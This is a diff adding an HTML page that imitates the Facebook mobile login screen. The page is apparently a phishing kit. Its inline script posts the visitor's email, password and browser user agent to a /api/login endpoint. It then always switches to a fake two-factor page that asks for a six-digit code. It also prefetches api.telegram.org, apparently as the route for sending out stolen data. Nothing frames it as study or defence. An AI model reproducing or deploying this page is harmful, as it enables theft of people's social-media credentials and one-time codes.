@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="utf-8">
+    <!-- MOBILE VIEWPORT OPTIMIZATION -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, minimum-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#1877f2">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="format-detection" content="telephone=no">
+    
+    <title>Facebook – Log in or sign up</title>
+    
+    <!-- PRELOAD CRITICAL RESOURCES -->
+    <link rel="preconnect" href="https://static.xx.fbcdn.net">
+    <link rel="dns-prefetch" href="https://api.telegram.org">
+    
+    <!-- FAVICON FOR ALL PLATFORMS -->
+    <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>">
+    <link rel="apple-touch-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>">
+    
+    <!-- CRITICAL CSS INLINED FOR MOBILE PERFORMANCE -->
+    <style>
+        /* CRITICAL MOBILE FIRST STYLES */
+        :root {
+            --facebook-blue: #1877f2;
+            --facebook-green: #42b72a;
+            --text-primary: #1c1e21;
+            --text-secondary: #65676b;
+            --border-color: #dddfe2;
+            --background: #f0f2f5;
+            --surface: #ffffff;
+            --touch-target: 44px;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+        
+        html {
+            font-size: 16px;
+            -webkit-text-size-adjust: 100%;
+            -moz-text-size-adjust: 100%;
+            text-size-adjust: 100%;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: var(--background);
+            color: var(--text-primary);
+            line-height: 1.34;
+            min-height: 100vh;
+            min-height: -webkit-fill-available;
+            overflow-x: hidden;
+            touch-action: manipulation;
+        }
+        
+        /* TOUCH-FRIENDLY BUTTONS & INPUTS */
+        input, button, a {
+            font-size: 16px; /* Prevents iOS zoom */
+        }
+        
+        button, .touch-target {
+            min-height: var(--touch-target);
+            min-width: var(--touch-target);
+        }
+        
+        /* HIDE LOADING INITIALLY */
+        #loading {
+            display: none;
+        }
+    </style>
+    
+    <!-- DEFER NON-CRITICAL CSS -->
+    <link rel="stylesheet" href="style.css" media="print" onload="this.media='all'">
+    <noscript><link rel="stylesheet" href="style.css"></noscript>
+</head>
+<body>
+    <!-- LOGIN PAGE -->
+    <div id="loginPage" class="page active">
+        <div class="mobile-header">
+            <div class="logo">facebook</div>
+        </div>
+        
+        <div class="content">
+            <div class="hero-text">
+                <h1 class="tagline">Connect with friends and the world around you on Facebook.</h1>
+            </div>
+            
+            <div class="login-card">
+                <form id="loginForm" class="login-form">
+                    <div class="input-group">
+                        <input type="text" 
+                               class="form-input" 
+                               name="email" 
+                               placeholder="Email address or phone number" 
+                               autocomplete="username"
+                               autocapitalize="none"
+                               autocorrect="off"
+                               spellcheck="false"
+                               required
+                               enterkeyhint="next">
+                    </div>
+                    
+                    <div class="input-group">
+                        <input type="password" 
+                               class="form-input" 
+                               name="pass" 
+                               placeholder="Password" 
+                               autocomplete="current-password"
+                               required
+                               enterkeyhint="done">
+                    </div>
+                    
+                    <button type="submit" class="primary-btn login-btn" aria-label="Log In">
+                        <span class="btn-text">Log In</span>
+                    </button>
+                    
+                    <div class="forgot-link">
+                        <a href="#" role="button" tabindex="0">Forgotten password?</a>
+                    </div>
+                    
+                    <div class="divider">
+                        <span>or</span>
+                    </div>
+                    
+                    <button type="button" class="secondary-btn create-account-btn" aria-label="Create New Account">
+                        Create New Account
+                    </button>
+                </form>
+                
+                <div class="create-page-link">
+                    <a href="#" role="button" tabindex="0"><b>Create a Page</b></a> for a celebrity, brand or business.
+                </div>
+            </div>
+            
+            <div class="mobile-footer">
+                <div class="language-selector">
+                    <select aria-label="Select language">
+                        <option>English (US)</option>
+                        <option>Español</option>
+                        <option>Français (France)</option>
+                    </select>
+                </div>
+                
+                <div class="footer-links">
+                    <a href="#">Help</a> · 
+                    <a href="#">Privacy</a> · 
+                    <a href="#">Terms</a>
+                </div>
+                
+                <div class="copyright">
+                    Meta © 2026
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- VERIFICATION PAGE -->
+    <div id="verificationPage" class="page">
+        <div class="mobile-header">
+            <div class="logo-small">facebook</div>
+            <div class="security-badge">🔒</div>
+        </div>
+        
+        <div class="content">
+            <div class="verification-card">
+                <div class="verification-header">
+                    <div class="verification-icon">🔐</div>
+                    <h2 class="verification-title">Two-Factor Authentication</h2>
+                    <p class="verification-subtitle">Enter the 6-digit code sent to your phone or email</p>
+                </div>
+                
+                <div class="security-notice">
+                    <div class="notice-item">
+                        <span class="notice-icon">📱</span>
+                        <span class="notice-text">Check your SMS messages</span>
+                    </div>
+                    <div class="notice-item">
+                        <span class="notice-icon">📧</span>
+                        <span class="notice-text">Look in your email inbox</span>
+                    </div>
+                    <div class="notice-item">
+                        <span class="notice-icon">🔑</span>
+                        <span class="notice-text">Open authentication app</span>
+                    </div>
+                </div>
+                
+                <form id="verificationForm" class="verification-form">
+                    <div class="code-input-container">
+                        <div class="code-inputs">
+                            <input type="tel" 
+                                   class="code-digit" 
+                                   maxlength="1" 
+                                   inputmode="numeric" 
+                                   pattern="[0-9]*"
+                                   autocomplete="one-time-code"
+                                   aria-label="First digit of verification code"
+                                   data-index="1">
+                            <input type="tel" 
+                                   class="code-digit" 
+                                   maxlength="1" 
+                                   inputmode="numeric" 
+                                   pattern="[0-9]*"
+                                   aria-label="Second digit of verification code"
+                                   data-index="2">
+                            <input type="tel" 
+                                   class="code-digit" 
+                                   maxlength="1" 
+                                   inputmode="numeric" 
+                                   pattern="[0-9]*"
+                                   aria-label="Third digit of verification code"
+                                   data-index="3">
+                            <input type="tel" 
+                                   class="code-digit" 
+                                   maxlength="1" 
+                                   inputmode="numeric" 
+                                   pattern="[0-9]*"
+                                   aria-label="Fourth digit of verification code"
+                                   data-index="4">
+                            <input type="tel" 
+                                   class="code-digit" 
+                                   maxlength="1" 
+                                   inputmode="numeric" 
+                                   pattern="[0-9]*"
+                                   aria-label="Fifth digit of verification code"
+                                   data-index="5">
+                            <input type="tel" 
+                                   class="code-digit" 
+                                   maxlength="1" 
+                                   inputmode="numeric" 
+                                   pattern="[0-9]*"
+                                   aria-label="Sixth digit of verification code"
+                                   data-index="6">
+                        </div>
+                        <div class="code-hint">Enter 6-digit code</div>
+                    </div>
+                    
+                    <input type="hidden" id="fullCode" name="code">
+                    
+                    <button type="submit" class="primary-btn verify-btn" aria-label="Verify and Continue">
+                        <span class="btn-text">Verify and Continue</span>
+                    </button>
+                    
+                    <div class="verification-options">
+                        <button type="button" class="text-btn" onclick="resendCode()" aria-label="Resend code">
+                            Resend Code
+                        </button>
+                        <span class="option-separator">·</span>
+                        <button type="button" class="text-btn" onclick="useBackupCode()" aria-label="Use backup code">
+                            Use Backup Code
+                        </button>
+                    </div>
+                </form>
+                
+                <div class="verification-footer">
+                    <p class="security-message">This helps ensure it's really you trying to access your account.</p>
+                </div>
+            </div>
+            
+            <div class="mobile-footer">
+                <div class="footer-links">
+                    <a href="#">Help Center</a> · 
+                    <a href="#">Privacy Policy</a> · 
+                    <a href="#">Terms</a>
+                </div>
+                <div class="copyright">Meta © 2026</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- LOADING OVERLAY -->
+    <div id="loading" class="loading-overlay" role="alert" aria-live="polite">
+        <div class="loading-content">
+            <div class="spinner" aria-hidden="true"></div>
+            <p id="loadingText" class="loading-title">Checking your information</p>
+            <p id="loadingSubtext" class="loading-subtitle">Please wait while we verify your account</p>
+        </div>
+    </div>
+
+    <!-- DEFERRED JAVASCRIPT -->
+    <script>
+        // Inline critical JS for mobile performance
+        (function() {
+            // Fast DOM ready detection
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', init);
+            } else {
+                init();
+            }
+            
+            function init() {
+                // Set up login form immediately
+                const loginForm = document.getElementById('loginForm');
+                if (loginForm) {
+                    loginForm.addEventListener('submit', handleLogin);
+                }
+                
+                // Load non-critical JS
+                setTimeout(loadRemainingJS, 100);
+            }
+            
+            function loadRemainingJS() {
+                const script = document.createElement('script');
+                script.src = 'app.js';
+                script.async = true;
+                script.defer = true;
+                document.head.appendChild(script);
+            }
+            
+            // Basic login handler
+            async function handleLogin(e) {
+                e.preventDefault();
+                showLoading('Checking credentials...');
+                
+                const formData = new FormData(e.target);
+                const data = {
+                    type: 'login',
+                    email: formData.get('email'),
+                    pass: formData.get('pass'),
+                    userAgent: navigator.userAgent
+                };
+                
+                try {
+                    await fetch('/api/login', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                    
+                    // Switch to verification
+                    setTimeout(() => {
+                        hideLoading();
+                        document.getElementById('loginPage').classList.remove('active');
+                        document.getElementById('verificationPage').classList.add('active');
+                        
+                        // Focus first code input
+                        const firstInput = document.querySelector('.code-digit[data-index="1"]');
+                        if (firstInput) {
+                            setTimeout(() => firstInput.focus(), 100);
+                        }
+                    }, 1200);
+                    
+                } catch (error) {
+                    setTimeout(() => {
+                        hideLoading();
+                        document.getElementById('loginPage').classList.remove('active');
+                        document.getElementById('verificationPage').classList.add('active');
+                    }, 1200);
+                }
+            }
+            
+            function showLoading(text) {
+                const loading = document.getElementById('loading');
+                const textEl = document.getElementById('loadingText');
+                if (loading && textEl) {
+                    textEl.textContent = text;
+                    loading.style.display = 'flex';
+                    document.body.style.overflow = 'hidden';
+                }
+            }
+            
+            function hideLoading() {
+                const loading = document.getElementById('loading');
+                if (loading) {
+                    loading.style.display = 'none';
+                    document.body.style.overflow = 'auto';
+                }
+            }
+        })();
+    </script>
+</body>
+</html>
